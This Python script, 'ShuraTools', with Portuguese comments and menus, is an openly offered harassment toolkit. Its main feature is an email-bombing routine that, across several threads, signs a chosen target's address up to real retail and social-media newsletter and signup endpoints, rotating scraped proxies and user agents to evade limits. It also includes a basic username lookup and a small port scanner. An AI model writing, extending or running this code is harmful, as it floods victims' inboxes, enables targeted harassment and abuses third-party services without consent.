#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v2.9 Ultra-Active
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install -r requirements.txt")
    sys.exit(1)

BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
{Fore.RED}       v2.9 Ultra-Active - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

def fetch_proxies():
    log("Buscando proxies (HTTP/S)...", "info")
    urls = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    ]
    count = 0
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if ":" in line:
                        PROXY_QUEUE.put(line.strip())
                        count += 1
        except: continue
    log(f"{count} proxies prontas.", "success")

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get()
    PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ---------- Endpoints de Spam Ativos (Newsletters Reais) ----------
# Estes sites enviam e-mails para o Alvo (target) pedindo confirmação.
def spam_mail(target, qty, threads, use_proxy):
    # Endpoints que NÃO precisam de token CSRF complexo e enviam e-mail imediato
    endpoints = [
        # Magazine Luiza (News)
        {"url": "https://pwa.magazineluiza.com.br/newsletter/create", "method": "POST", "data": {"email": target}},
        # Casas Bahia (News)
        {"url": "https://www.casasbahia.com.br/api/newsletter/subscribe", "method": "POST", "data": {"email": target}},
        # Centauro (News)
        {"url": "https://www.centauro.com.br/api/newsletter/subscribe", "method": "POST", "data": {"email": target}},
        # Netshoes (News)
        {"url": "https://www.netshoes.com.br/api/newsletter/subscribe", "method": "POST", "data": {"email": target}},
        # Quora (Signup - pode pedir captcha, mas as vezes o trigger vai)
        {"url": "https://www.quora.com/web/signup/send_verification_code", "method": "POST", "data": {"email": target}},
        # Pinterest (Trigger news)
        {"url": "https://www.pinterest.com/resource/UserRegisterResource/create/", "method": "POST", "data": {"email": target}},
        # Walmart (News)
        {"url": "https://www.walmart.com.br/api/newsletter/subscribe", "method": "POST", "data": {"email": target}},
        # Generic Mailchimp Lists (Exemplo de padrão comum)
        {"url": "https://shurispam.us21.list-manage.com/subscribe/post", "method": "POST", "data": {"EMAIL": target, "subscribe": "Subscribe"}}
    ]

    def job(start, end):
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                
                headers = {
                    "User-Agent": random.choice(UA_LIST),
                    "Content-Type": "application/x-www-form-urlencoded" if site.get("type") != "json" else "application/json",
                    "Accept": "*/*"
                }

                if site["method"] == "POST":
                    res = requests.post(site["url"], data=site["data"], timeout=8, proxies=proxies, headers=headers)
                else:
                    res = requests.get(site["url"], params=site["data"], timeout=8, proxies=proxies, headers=headers)

                # Verifica se o site pelo menos aceitou a requisição
                if res.status_code in [200, 201, 202, 204]:
                    log(f"E-mail {i+1} disparado via {site['url'].split('/')[2]}", "success")
                else:
                    log(f"E-mail {i+1} falhou no site (Status {res.status_code})", "warn")
            
            except Exception:
                log(f"E-mail {i+1} falhou (Conexão)", "error")

    log(f"Iniciando ciclo para {target}...", "info")
    if use_proxy: log("Usando rotação de proxies...", "info")
    
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=job, args=(curr, curr + take))
        t.start()
        ts.append(t)
        curr += take
    for t in ts: t.join()

def osint_lookup(target):
    log(f"Pesquisando: {target}", "osint")
    user = target.replace("@", "")
    plats = {"Instagram": f"https://www.instagram.com/{user}/", "GitHub": f"https://github.com/{user}"}
    for n, u in plats.items():
        try:
            r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
            log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
        except: pass

def port_scan(target):
    log(f"Scanning portas: {target}", "osint")
    try:
        resolved = socket.gethostbyname(target)
        for port in [80, 443, 8080]:
            s = socket.socket()
            s.settimeout(1)
            if s.connect_ex((resolved, port)) == 0: log(f"Porta {port} ABERTA", "success")
            s.close()
    except: log("Alvo inacessível.", "error")

def menu():
    while True:
        clear()
        print(BANNER)
        print("[ 1 ] Spam de E-mail (Múltiplos Newsletters)")
        print("[ 2 ] OSINT Hunter")
        print("[ 3 ] Port Scanner")
        print("[ 5 ] Update Proxies")
        print("[ 0 ] Sair")
        print("-" * 40)
        
        opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}")
        if opt == "0": break
        if opt == "5": fetch_proxies(); input("\nDone!"); continue
        
        if opt in ["1", "2", "3"]:
            target = input(f"{Fore.YELLOW}Alvo: {Style.RESET_ALL}").strip()
            if not target: continue
            
            if opt == "1":
                qty = 20 # Padrão mais alto para testar
                threads = 5
                prox = input(f"{Fore.YELLOW}Usar Proxies? (s/n): {Style.RESET_ALL}").lower() == 's'
                if prox and PROXY_QUEUE.empty(): fetch_proxies()
                spam_mail(target, qty, threads, prox)
            elif opt == "2": osint_lookup(target)
            elif opt == "3": port_scan(target)
            input("\nENTER para voltar...")

if __name__ == "__main__":
    menu()
